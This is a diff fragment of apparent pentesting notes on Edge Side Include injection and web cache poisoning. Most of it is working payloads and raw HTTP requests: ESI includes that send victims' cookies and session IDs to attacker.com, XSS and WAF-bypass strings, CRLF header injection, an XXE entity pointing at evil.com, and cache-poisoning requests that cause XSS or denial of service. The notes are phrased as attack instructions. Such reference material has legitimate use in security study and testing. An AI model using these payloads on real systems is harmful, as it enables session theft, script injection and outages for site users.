+<!--#printenv -->
+// Setting variables
+<!--#set var="name" value="Rich" -->
+```
+
+## Edge side inclusion
+There is a problem **caching information or dynamic applications** as part of the content may have **varied** for the next time the content is retrieved. This is what **ESI** is used form, to indicate using ESI tags the **dynamic content that needs to be generated** before sending the cache version.
+if an **attacker** is able to **inject an ESI tag** inside the cache content, then, he could be able to i**nject arbitrary content** on the document before it's sent to the users.
+
+
+#### ESI Detection 
+
+The following header in a response from the server means that the server is using ESI:
+
+	Surrogate-Control: content="ESI/1.0"
+
+if you can't find this header , the server **might be using ESI anyways** A **Blind Exploition approach can also be used** as a request should arrive to the attackers server:
+
+```
+// Basic detection
+hell<!--esi-->o 
+// If previous is reflected as "hello", it's vulnerable
+
+// Blind detection
+<esi:include src=http://attacker.com>
+
+// XSS Exploitation Example
+<esi:include src=http://attacker.com/XSSPAYLOAD.html>
+
+// Cookie Stealer (bypass httpOnly flag)
+<esi:include src=http://attacker.com/?cookie_stealer.php?=$(HTTP_COOKIE)>
+
+// Introduce private local files (Not LFI per se)
+<esi:include src="supersecret.txt">
+
+// Valid for Akamai, sends debug information in the response
+<esi:debug/>
+```
+
+#### ESI exploitation 
+[ GoSecure created](https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/) a table to understand possible attacks that we can try against different ESI-capable software, depending on the functionality supported:
+
+- **Includes**: Supports the `<esi:includes>` directive
+    
+- **Vars**: Supports the `<esi:vars>` directive. Useful for bypassing XSS Filters
+    
+- **Cookie**: Document cookies are accessible to the ESI engine
+    
+- **Upstream Headers Required**: Surrogate applications will not process ESI statements unless the upstream application provides the headers
+    
+- **Host Allowlist**: In this case, ESI includes are only possible from allowed server hosts, making SSRF, for example, only possible against those hosts
+    
+
+|   |   |   |   |   |   |
+|---|---|---|---|---|---|
+|**Software**|**Includes**|**Vars**|**Cookies**|**Upstream Headers Required**|**Host Whitelist**|
+|Squid3|Yes|Yes|Yes|Yes|No|
+|Varnish Cache|Yes|No|No|Yes|Yes|
+|Fastly|Yes|No|No|No|Yes|
+|Akamai ESI Test Server (ETS)|Yes|Yes|Yes|No|No|
+|NodeJS esi|Yes|Yes|Yes|No|No|
+|NodeJS nodesi|Yes|No|No|No|Optional|
+
+#### XSS
+The following ESI directive will load an arbitrary file inside the response of the server
+
+Copy
+
+```
+<esi:include src=http://attacker.com/xss.html>
+```
+
+#### Bypassing client xss protection
+```
+x=<esi:assign name="var1" value="'cript'"/><s<esi:vars name="$(var1)"/>>alert(/Chrome%20XSS%20filter%20bypass/);</s<esi:vars name="$(var1)"/>>
+
+Use <!--esi--> to bypass WAFs:
+<scr<!--esi-->ipt>aler<!--esi-->t(1)</sc<!--esi-->ript>
+<img+src=x+on<!--esi-->error=ale<!--esi-->rt(1)>
+```
+
+#### Steal cookie
+- Remote steal cookie
+    
+
+
+
+```
+<esi:include src=http://attacker.com/$(HTTP_COOKIE)>
+<esi:include src="http://attacker.com/?cookie=$(HTTP_COOKIE{'JSESSIONID'})" />
+```
+
+- Steal cookie HTTP_ONLY with XSS by reflecting it in the response:
+    
+
+
+
+```
+# This will reflect the cookies in the response
+<!--esi $(HTTP_COOKIE) -->
+# Reflect XSS (you can put '"><svg/onload=prompt(1)>' URL encoded and the URL encode eveyrhitng to send it in the HTTP request)
+<!--esi/$url_decode('"><svg/onload=prompt(1)>')/-->
+
+# It's possible to put more complex JS code to steal cookies or perform actions
+```
+
+#### Private Local File
+
+Do not confuse this with a "Local File Inclusion":
+
+
+```
+<esi:include src="secret.txt">
+```
+
+#### CRLF
+ 
+```
+<esi:include src="http://anything.com%0d%0aX-Forwarded-For:%20127.0.0.1%0d%0aJunkHeader:%20JunkValue/"/>
+```
+
+#### Open Redirect
+he following will add a `Location` header to the response
+
+
+```
+<!--esi $add_header('Location','http://attacker.com') -->
+```
+
+#### Add Header 
+
+-   
+    Add header in forced request
+    
+
+```
+<esi:include src="http://example.com/asdasd">
+<esi:request_header name="User-Agent" value="12345"/>
+</esi:include>
+```
+- Add header in response (useful to bypass "Content-Type: text/json" in a response with XSS)
+    
+
+```
+<!--esi/$add_header('Content-Type','text/html')/-->
+
+<!--esi/$(HTTP_COOKIE)/$add_header('Content-Type','text/html')/$url_decode($url_decode('"><svg/onload=prompt(1)>'))/-->
+
+# Check the number of url_decode to know how many times you can URL encode the value
+```
+
+#### CRLF in Add header (**CVE-2019-2438)**
+
+Copy
+
+```
+<esi:include src="http://example.com/asdasd">
+<esi:request_header name="User-Agent" value="12345
+Host: anotherhost.com"/>
+</esi:include>
+```
+
+#### Akamai debug
+
+This will send debug information included in the response:
+
+
+```
+<esi:debug/>
+```
+
+### ESI + XSLT = XXE
+
+By specifying the `xslt` value for the _dca_ parameter, it is feasible to include `**eXtensible Stylesheet Language Transformations (XSLT)**` based ESI. The inclusion causes the HTTP surrogate to retrieve the XML and XSLT files, with the latter filtering the former. Such XML files are exploitable for _XML External Entity (XXE)_ attacks, enabling attackers to execute SSRF attacks. However, the utility of this approach is limited since ESI includes already serve as an SSRF vector. Due to the absence of support in the underlying Xalan library, external DTDs are not processed, preventing local file extraction.
+
+
+```
+<esi:include src="http://host/poc.xml" dca="xslt" stylesheet="http://host/poc.xsl" />
+```
+
+XSLT file:
+
+
+```
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE xxe [<!ENTITY xxe SYSTEM "http://evil.com/file" >]>
+<foo>&xxe;</foo>
+```
+
 
 
 
@@ -1687,7 +2692,7 @@ with a particular keyword. The -g option indicates a general keyword search:
 
 
 
-# <font color="red">Web Cache Poisonign</font>
+# <font color="red">Cache Poisonign</font>
 
 #### what is the difference between web cache poisoning and web cache deception ?
 #### in Web cache poisoning, the attacker causes the application to store some malicious content in the cache, and this content is served from the cache to other application users.
@@ -1714,6 +2719,266 @@ with a particular keyword. The -g option indicates a general keyword search:
 #### Manipulating inputs to elicit a harmful response is half the battle, but it doesn't achieve much unless you can cause the response to be cached, which can sometimes be tricky.
 
 #### whether or not a response gets cached can depend on all kind of factors , such as the file extension, content type, route, status code ,  and response header . you will properly need to devote some time to simply playing around with requests on different pages and studying how the cache behaves. once you  work out how to get a response cached that contains your malicous input , you are ready to deliver the exploit to victims 
+
+
+#### <font color="red">Discovery :</font>
+##### check for Http headers : usually when a response was stored in the cache there will be a header indicating so , you can check which headers you should pay [attention](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/special-http-headers#cache-headers)
+**Server Cache Headers**:
+
+- `**X-Cache**` in the response may have the value `**miss**` when the request wasn't cached and the value `**hit**` when it is cached
+    
+    - Similar behaviour in the header `**Cf-Cache-Status**`
+        
+    
+- `**Cache-Control**` indicates if a resource is being cached and when will be the next time the resource will be cached again: `Cache-Control: public, max-age=1800`
+    
+- `**Vary**` is often used in the response to **indicate additional headers** that are treated as **part of the cache key** even if they are normally unkeyed.
+    
+- `**Age**` defines the times in seconds the object has been in the proxy cache.
+    
+- `**Server-Timing: cdn-cache; desc=HIT**` also indicates that a resource was cached
+
+##### check for caching error codes
+If you are thinking that the response is being stored in a cache, you could try to **send requests with a bad header**, which should be responded to with a **status code 400**. Then try to access the request normally and if the **response is a 400 status code**, you know it's vulnerable (and you could even perform a DoS).
+However, note that **sometimes these kinds of status codes aren't cached** so this test could not be reliable.
+
+##### You could use [**Param Miner**](https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943) to **brute-force parameters and headers** that may be **changing the response of the page**.
+
+##### <font color="red">Elicit a harmful response from the back-end server</font>
+With the parameter/header identified check how it is being **sanitised** and **where** is it **getting reflected** or affecting the response from the header. Can you abuse it anyway (perform an XSS or load a JS code controlled by you? perform a DoS?...)
+
+The header `X-Cache` in the response could be very useful as it may have the value `**miss**` when the request wasn't cached and the value `**hit**` when it is cached. The header `**Cache-Control**` is also interesting to know if a resource is being cached and when will be the next time the resource will be cached again: `Cache-Control: public, max-age=1800` Another interesting header is `**Vary**`. This header is often used to **indicate additional headers** that are treated as **part of the cache key** even if they are normally unkeyed. Therefore, if the user knows the `User-Agent` of the victim he is targeting, he can poison the cache for the users using that specific `User-Agent`.
+
+One more header related to the cache is `**Age**`. It defines the times in seconds the object has been in the proxy cache.
+
+When caching a request, be **careful with the headers you use** because some of them could be **used unexpectedly** as **keyed** and the **victim will need to use that same header**. Always **test** a Cache Poisoning with **different browsers** to check if it's working
+
+##### <font color="red">Example</font>
+A header like `X-Forwarded-For` is being reflected in the response unsanitized. You can send a basic XSS payload and poison the cache so everybody that accesses the page will be XSSed:
+
+Copy
+
+```
+GET /en?region=uk HTTP/1.1
+Host: innocent-website.com
+X-Forwarded-Host: a."><script>alert(1)</script>"
+```
+
+_Note that this will poison a request to_ `_/en?region=uk_` _not to_ `_/en_`
+
+#### <font color="red">cache poisoning to DoS</font>
+##### - **Http Header oversize** 
+Send a request with a header size larger than the one supported by the web server but smaller than the one supported by
+the cache server. The web server will respond with a 400 response which might be cached:
+
+Copy
+
+```
+GET / HTTP/1.1
+Host: redacted.com
+X-Oversize-Hedear:Big-Value-000000000000000
+```
+
+##### - **HTTP Meta Character (HMC) & Unexpected values**
+Send a header that contain some **harmfull meta characters** such as and . In order the attack to work you must bypass the cache first.
+
+Copy
+
+```
+GET / HTTP/1.1
+Host: redacted.com
+X-Meta-Hedear:Bad Chars\n \r
+```
+
+A badly configured header could be just `\:` as a header.
+
+This could also work if unexpected values are sent, like an unexpected Content-Type:
+
+Copy
+
+```
+GET /anas/repos HTTP/2
+Host: redacted.com
+Content-Type: HelloWorld
+```
+
+##### - **Unkeyed header**
+Some websites will return an error status code if they **see some specific headers i**n the request like with the _X-Amz-Website-Location-Redirect: someThing_ header:
+
+Copy
+
+```
+GET /app.js HTTP/2
+Host: redacted.com
+X-Amz-Website-Location-Redirect: someThing
+
+HTTP/2 403 Forbidden
+Cache: hit
+
+Invalid Header
+```
+
+##### - **HTTP Method Override Attack (HMO)**
+f the server supports changing the HTTP method with headers such as `X-HTTP-Method-Override`, `X-HTTP-Method` or `X-Method-Override`. It's possible to request a valid page changing the method so the server doesn't supports it so a bad response gets cached:
+
+Copy
+
+```
+GET /blogs HTTP/1.1
+Host: redacted.com
+HTTP-Method-Override: POST
+```
+
+##### - **Unkeyed Port**
+If port in the Host header is reflected in the response and not included in the cache key, it's possible to redirect it to an unused port:
+
+Copy
+
+```
+GET /index.html HTTP/1.1
+Host: redacted.com:1
+
+HTTP/1.1 301 Moved Permanently
+Location: https://redacted.com:1/en/index.html
+Cache: miss
+```
+
+##### - **Long Redirect DoS**
+
+Like in the following example, x is not being cached, so an attacker could abuse the redirect response behaviour to make the redirect send a URL so big that it returns an error. Then, people trying to access the URL without the uncached x key will get the error response:
+
+Copy
+
+```
+GET /login?x=veryLongUrl HTTP/1.1
+Host: www.cloudflare.com
+
+HTTP/1.1 301 Moved Permanently
+Location: /login/?x=veryLongUrl
+Cache: hit
+
+GET /login/?x=veryLongUrl HTTP/1.1
+Host: www.cloudflare.com
+
+HTTP/1.1 414 Request-URI Too Large
+CF-Cache-Status: miss
+```
+
+##### - **Host header case normalization**
+
+The host header should be case insensitive but some websites expect it to be lowercase returning an error if it's not:
+
+Copy
+
+```
+GET /img.png HTTP/1.1
+Host: Cdn.redacted.com
+
+HTTP/1.1 404 Not Found
+Cache:miss
+
+Not Found
+```
+##### - **Path normalization**
+
+
+Some pages will return error codes sending data URLencode in the path, however, the cache server with URLdecode the path and store the response for the URLdecoded path:
+
+Copy
+
+```
+GET /api/v1%2e1/user HTTP/1.1
+Host: redacted.com
+
+
+HTTP/1.1 404 Not Found
+Cach:miss
+
+Not Found
+```
+
+##### - **Fat Get**
+
+Some cache servers, like Cloudflare, or web servers, stops GET requests with a body, so this oucld be abused to cache a invalid response:
+
+Copy
+
+```
+GET /index.html HTTP/2
+Host: redacted.com
+Content-Length: 3
+
+xyz
+
+
+HTTP/2 403 Forbidden 
+Cache: hit
+```
+
+
+#### <font color="red">Using web cache poisoning to exploit cookie-handling vulnerabilities</font>
+
+Cookies could also be reflected on the response of a page. If you can abuse it to cause an XSS for example, you could be able to exploit XSS in several clients that load the malicious cache response.
+
+Copy
+
+```
+GET / HTTP/1.1
+Host: vulnerable.com
+Cookie: session=VftzO7ZtiBj5zNLRAuFpXpSQLjS4lBmU; fehost=asd"%2balert(1)%2b"
+```
+
+Note that if the vulnerable cookie is very used by the users, regular requests will be cleaning the cache.
+
+#### <font color="red">Cache poisoning with path traversal to steal API key</font>
+[**This writeup explains**](https://nokline.github.io/bugbounty/2024/02/04/ChatGPT-ATO.html) how it was possible to steal an OpenAI API key with an URL like `https://chat.openai.com/share/%2F..%2Fapi/auth/session?cachebuster=123` because anything matching `/share/*` will be cached without Cloudflare normalising the URL, which was done when the request reached the web server.
+
+#### <font color="red">Using multiple headers to exploit web cache poisoning vulnerabilities</font>
+
+Sometimes you will need to **exploit several unkeyed inputs** to be able to abuse a cache. For example, you may find an **Open redirect** if you set `X-Forwarded-Host` to a domain controlled by you and `X-Forwarded-Scheme` to `http`.**If** the **server** is **forwarding** all the **HTTP** requests **to HTTPS** and using the header `X-Forwarded-Scheme` as the domain name for the redirect. You can control where the page is pointed by the redirect.
+
+
+```
+GET /resources/js/tracking.js HTTP/1.1
+Host: acc11fe01f16f89c80556c2b0056002e.web-security-academy.net
+X-Forwarded-Host: ac8e1f8f1fb1f8cb80586c1d01d500d3.web-security-academy.net/
+X-Forwarded-Scheme: http
+```
+
+#### <font color="red">Exploited with limited Vary header</font >
+
+if you found the `X-Host` header is being used **as domain name to load JS resources** but the `Vary` header in the response is indicating `User-Agent`. Then, you need to find a way to exfiltrate the User-Agent of the victim and poison the cache using that user agent 
+
+```
+GET / HTTP/1.1
+Host: vulnerbale.net
+User-Agent: THE SPECIAL USER-AGENT OF THE VICTIM
+X-Host: attacker.com
+```
+
+#### <font color="red">Fat GET</font>
+Send a GET request with the request in the URL and in the body. If the web server uses the one from the body but the cache server caches the one from the URL, anyone accessing that URL will actually use the parameter from the body. Like the vuln James Kettle found at the Github website:
+
+
+```
+GET /contact/report-abuse?report=albinowax HTTP/1.1
+Host: github.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 22
+
+report=innocent-victim
+```
+
+There it a portswigger lab about this: [https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-fat-get](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-fat-get)
+
+
+#### <font color="red">Parameter Cloaking </font>
+For example it's possible to separate **parameters** in ruby servers using the char **;** instead of **&**. This could be used to put unkeyed parameters values inside keyed ones and abuse them.
+
+Portswigger lab: [https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking)
+#### <font color="red">Automated testing for Web Cache Poisoning</font>
+
+The [Web Cache Vulnerability Scanner](https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner) can be used to automatically test for web cache poisoning. It supports many different techniques and is highly customizable.
 
 ### <font color="red">Prevention</font>:
 
